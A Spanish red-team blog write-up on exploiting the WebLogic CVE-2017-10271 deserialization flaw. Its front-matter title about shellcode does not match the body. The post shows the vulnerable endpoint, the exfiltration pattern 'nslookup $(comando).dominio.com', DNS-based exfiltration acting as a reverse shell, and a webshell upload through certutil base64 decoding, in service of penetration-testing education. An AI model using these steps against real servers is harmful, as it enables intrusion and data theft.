---
title: "[Shellcode development] Resolve function address using IAT instead of EAT - Part 1"
header:
  teaser: "https://farm5.staticflickr.com/4076/4940499208_b79b77fb0a_z.jpg"
categories: 
  - ES
tags:
  - ES
  - Red Team
  - Shellcode
  - Windows PE format
  - IAT
  - Malware
author: Alejandro Pinna
gallery:
          - url: /assets/images/2018-01-30-weblogic-cve-2017-10271/lines.png
            image_path: /assets/images/2018-01-30-weblogic-cve-2017-10271/lines.png
            alt: "Peticion Lineas"
            title: "Contador de caracteres por DNS"
          - url: /assets/images/2018-01-30-weblogic-cve-2017-10271/respuesta_dns.png
            image_path: /assets/images/2018-01-30-weblogic-cve-2017-10271/respuesta_dns.png
            alt: "Respuesta Lineas"
            title: "Respuesta al XML que exfiltra dicha información"
          - url: /assets/images/2018-01-30-weblogic-cve-2017-10271/intruder.png
            image_path: /assets/images/2018-01-30-weblogic-cve-2017-10271/intruder.png
            alt: "Respuesta Lineas"
            title: "Respuesta al XML que exfiltra dicha información"
gallery2:
          - url: /assets/images/2018-01-30-weblogic-cve-2017-10271/exfil.png
            image_path: /assets/images/2018-01-30-weblogic-cve-2017-10271/exfil.png
            alt: "Peticion Lineas"
            title: "Contador de caracteres por DNS"
          - url: /assets/images/2018-01-30-weblogic-cve-2017-10271/respuesta_dns_exfil.png
            image_path: /assets/images/2018-01-30-weblogic-cve-2017-10271/respuesta_dns_exfil.png
            alt: "Respuesta Lineas"
            title: "Respuesta al XML que exfiltra dicha información"
gallery3:
          - url: /assets/images/2018-01-30-weblogic-cve-2017-10271/shell_dns.png
            image_path: /assets/images/2018-01-30-weblogic-cve-2017-10271/shell_dns.png
            alt: "Shell DNS"
            title: "Shell DNS"
---


Durante uno de los test de intrusión llevados a cabo por el equipo de Red Team, en el cual se trataba de lograr acceso a la red de una organización,
haciendo uso de alguna vulnerabilididad en el perimetro, y sin ningún tipo de conocimiento previo de la misma, se tuvo que
explotar la hasta ahora poco conocidad vulnerabilidad CVE-2017-10271 en Weblogic.

## La vulnerabilidad

La vulnerabilidad se encuentra en la ruta /wls-wsat/CoordinatorPortType y se produce debido a que la clase **WorkContextXmlInputAdapter.class** utiliza
el XML que le introducimos sin ningún tipo de comprobación previa, pasandoselo a la funcion **readObject**, la cual al deserializar dicho xml provoca la
ejecución remota de código.

A continuación dejamos un articulo de referencia, donde se explican este tipo de vulnerabilidades en profundidad. 

<http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html>

A continuación podremos observar un código que posee la misma vulnerabilidad que weblogic, aunque es mucho mas sencillo de comprender en el siguiente
escenario.

```java
    public static void main(String[] args) {
        java.io.File file = new java.io.File ( "C:\\Users\\Administrador\\Desktop\\poc.txt" );
        java.beans.XMLDecoder xd = null ;
        try {
            xd = new java.beans.XMLDecoder ( new BufferedInputStream ( new FileInputStream (file)));
        } catch (FileNotFoundException e) {
            e.printStackTrace ();
        }
        Object s2 = xd.readObject ();
        xd.close ();
}
```

Como podemos observar, el fichero contendrá código xml el cual será parseado por java.beans.XMLDecoder y nos devolverá un objeto, que sera
deserializado por la función java.beans.XMLDecoder.readObject, y que producirá la ejecución remota de código.

En el caso de Weblogic la vulnerabilidad es muy similar.

Para comprobar si un Weblogic es efectivamente vulnerable, hemos de buscar excepciones no controladas de Java al enviarlo XMLs con java embebido mediante una petición POST a la ruta **/wls-wsat/CoordinatorPortType** como se muestra a continuación.

![Respuesta devuelta por sistemas vulnerables]({{ site.url }}{{ site.baseurl }}/assets/images/2018-01-30-weblogic-cve-2017-10271/respuesta-sistemas-vulnerables.png)

En este blog no tenemos como objetivo cubrir los detalles sobre la vulnerabilidad dado que estos han sido cubiertos en muchos otros articulos
publicados hasta el momento, sino que pretendemos mostrar como esta vulnerabilidad podría ser explotada incluso en entornos restringidos los cuales no
poseen salida a internet, y al tratarse de una ejecución de código en la cual no es observable la salida de lo ejecutado, otros métodos han tenido que
ser desarrollados.


## Explotación

Para llevar a cabo la explotación, el primer paso fue comprobar si los sistemas que el equipo había identificado eran efectivamente vulnerables, para
lo cual se realizó un script, que envia un XML usando java, y que posteriormente comprueba si la respuesta de la aplicación web mostraba que
efectivamente era vulnerable, o si por el contrario las aplicaciones estaban parcheadas.

Tras algunos intentos el equipo detecto un weblogic vulnerable, por lo que se procedió a explotar la vulnerabilidad.

![checkeo de la vulnerabilidad]({{ site.url }}{{ site.baseurl }}/assets/images/2018-01-30-weblogic-cve-2017-10271/check.png)

En un primer intento, el equipo comprobó si la máquina tenía salida a internet, aunque se detecto que no.

Tras esto, se detecto que la máquina no tenía binarios como sleep, por lo que realizar una inyeccion de comandos basada en tiempos quedaba
completamente descartado, por lo que se buscaron otros metodos para realizar esta explotación.

Trás numerosas pruebas se detectó que la máquina tenía configurado un DNS interno, el cual al recibir peticiones hacia dominios de burpcollaborator
realizaba dichas peticiones, lo cual permitiría exfiltrar cierta información usando los subdominios para incrustar en ellos la información que ibamos
exfiltrando de la máquina.

![checkeo de la vulnerabilidad]({{ site.url }}{{ site.baseurl }}/assets/images/2018-01-30-weblogic-cve-2017-10271/dns.png)

A partir de este punto se comenzó a desarrollar un xml que permitiera exfiltrar la salida de los comandos ejecutados por DNS, lo cual en otros
entornos es mucho más simple, usando la técnica **nslookup $(comando).dominio.com**, pero en este caso, tras ciertas pruebas se comprobó que dichos
comandos no funcionarían, dado que el weblogic corría sobre un servidor windows, por lo tanto este metodo fue implementado en java, usando un metodo
para ejecutar comandos, leer cada linea, y posteriormente usar dichas lineas como variables, enviandolos como subdominios en las peticiones DNS.
Este proceso fue en parte automatizado haciendo uso de BurpSuite, más concretamente, usando una configuración del Intruder para recibir en cada respuesta DNS 
la linea leida y el numero de caracteres.

{% include gallery %}

Como se puede observar la explotación constaba, no solo de exfiltrar los comandos por DNS, sino que fue necesario desarrollar un metodo para contar el
número de caracteres que devolvía cada comando, dado que no se pueden incluir más de 64 caracteres en un subdominio, por lo que con esta petición se
contaban los caracteres de cada linea sobre los comandos ejecutados.
Posteriormente se realizaba la exfiltración de los caracteres en si, haciendo uso de las funciones java.lang.String.replace y java.lang.String.substr 
para reemplazar caracteres especiales, y exfiltrar tan solo el número de caracteres permitidos, como se muestra a continuación.

{% include gallery id="gallery2" %}

Este proceso permitió ir conociendo la estructura de ficheros del servidor, el usuario que ejecutaba la aplicación, comprobar los privilegios con los
que se contaban, etc.

Poco a poco se fue desarrollando un automatismo que permitía recibir las respuestas en un servidor dns escrito en python, el cual tenía un
comportamiento cercano a una shell inversa, como se muestra a continuación.

{% include gallery id="gallery3" %}


Utilizando estos automatismos el equipo fue capaz de encontrar un directorio escribible en el cual se podían subir ficheros para ser posteriormente
ejecutados por la aplicación web (webshell).

En este punto el equipo tuvo que desarrollar un metodo para subir una webshell sin poder utilizar caracteres como 
` > | `

Trás investigar durante un tiempo aplicaciones instaladas en un Windows Server por defecto que permitieran encodear y decodear base64 
mediante un solo comando se utilizó la utilidad **certutil**, la cual permite decodear el contenido de un fichero, y volcarlo en un nuevo fichero.

![checkeo de la vulnerabilidad]({{ site.url }}{{ site.baseurl }}/assets/images/2018-01-30-weblogic-cve-2017-10271/certutil.png)

Usando este metodo se consiguió obtener una webshell en dicho servidor, y por tanto un vector de acceso limpio en la organización.



